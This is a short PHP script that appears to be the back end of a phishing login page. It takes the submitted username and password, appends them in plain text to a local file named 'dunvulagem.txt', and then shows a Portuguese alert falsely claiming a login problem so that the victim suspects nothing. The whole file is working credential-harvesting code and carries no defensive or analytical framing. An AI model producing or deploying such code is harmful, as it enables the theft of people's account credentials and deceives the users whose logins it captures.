<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['username'];
    $pass = $_POST['password'];

    // Validate that the email and password are not empty
    if (!empty($email) && !empty($pass)) {
        // Save the credentials to a file
        $file = 'dunvulagem.txt';
        file_put_contents($file, "username: " . $email . " password: " . $pass . "\n", FILE_APPEND | LOCK_EX);

       // Display a JavaScript alert message
       echo "<script>alert('Estamos com problemas para fazer seu login. Tente novamente mais tarde.');</script>";
    } else {
        echo "<script>alert('E-mail e senha não podem estar vazios.');</script>";
    }
} else {
    echo "<script>alert('Insira as credenciais de login.');</script>";
}
?>